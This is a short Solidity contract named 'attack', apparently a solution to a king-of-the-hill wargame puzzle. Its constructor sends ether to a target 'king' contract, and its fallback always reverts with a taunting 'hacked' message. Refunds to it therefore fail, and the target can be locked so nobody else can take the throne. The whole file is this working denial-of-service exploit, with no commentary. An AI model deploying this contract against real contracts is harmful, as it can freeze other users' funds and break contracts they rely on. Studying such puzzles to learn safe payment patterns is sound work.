// SPDX-License-Identifier: MIT
pragma solidity ^ 0.8.0 ;

contract attack{
    constructor(address _kingAddress)public payable{
        address(_kingAddress).call{value: msg.value}("");
    }
    fallback() external payable{
        revert("sry u have been hacked!!!!");
    }

}
